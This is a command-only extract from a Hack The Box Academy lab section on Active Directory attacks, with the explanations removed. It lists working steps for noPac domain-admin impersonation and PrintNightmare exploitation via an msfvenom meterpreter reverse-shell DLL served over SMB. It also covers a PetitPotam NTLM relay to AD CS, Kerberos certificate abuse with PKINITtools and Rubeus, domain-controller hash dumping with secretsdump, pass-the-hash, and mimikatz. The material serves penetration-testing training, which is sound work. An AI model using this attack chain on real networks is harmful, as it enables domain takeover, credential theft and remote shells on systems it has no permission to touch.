# Section 25: Bleeding Edge Vulnerabilities

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1484
- Code/command blocks: 26

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession`

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

## 2. `shellsession`

```bash
python setup.py install
```

## 3. `shellsession`

```bash
git clone https://github.com/Ridter/noPac.git
```

## 4. `shellsession` _(output omitted)_

```bash
sudo python3 scanner.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}} -use-ldap
```

## 5. `shellsession` _(output omitted)_

```bash
sudo python3 noPac.py {{DOMAIN_UPPER}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}}  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

## 6. `shellsession` _(output omitted)_

```bash
ls
```

## 7. `shellsession` _(output omitted)_

```bash
sudo python3 noPac.py {{DOMAIN_UPPER}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}}  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user {{DOMAIN_NB}}/administrator
```

## 8. `shellsession`

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

## 9. `shellsession` _(output omitted)_

```bash
rpcdump.py @{{DC_IP}} | egrep 'MS-RPRN|MS-PAR'
```

## 10. `shellsession` _(output omitted)_

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

## 11. `shellsession` _(output omitted)_

```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

## 12. `shellsession` _(output omitted)_

```bash
sudo python3 CVE-2021-1675.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{DC_IP}} '\\172.16.5.225\CompData\backupscript.dll'
```

## 13. `shellsession` _(output omitted)_

```bash
whoami
```

## 14. `shellsession` _(output omitted)_

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
```

## 15. `shellsession` _(output omitted)_

```bash
python3 PetitPotam.py 172.16.5.225 {{DC_IP}}       
```

## 16. `shellsession` _(output omitted)_

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.{{DOMAIN_UPPER}}/certsrv/certfnsh.asp --adcs --template DomainController
```

## 17. `shellsession` _(output omitted)_

```bash
python3 /opt/PKINITtools/gettgtpkinit.py {{DOMAIN_UPPER}}/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```

## 18. `shellsession`

```bash
export KRB5CCNAME=dc01.ccache
```

## 19. `shellsession` _(output omitted)_

```bash
secretsdump.py -just-dc-user {{DOMAIN_NB}}/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.{{DOMAIN_UPPER}}
```

## 20. `shellsession` _(output omitted)_

```bash
klist
```

## 21. `shellsession` _(output omitted)_

```bash
crackmapexec smb {{DC_IP}} -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

## 22. `shellsession` _(output omitted)_

```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 {{DOMAIN_UPPER}}/ACADEMY-EA-DC01$
```

## 23. `shellsession` _(output omitted)_

```bash
secretsdump.py -just-dc-user {{DOMAIN_NB}}/administrator "ACADEMY-EA-DC01$"@{{DC_IP}} -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

## 24. `powershell` _(output omitted)_

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

## 25. `powershell` _(output omitted)_

```powershell
klist
```

## 26. `powershell` _(output omitted)_

```powershell
cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe
```

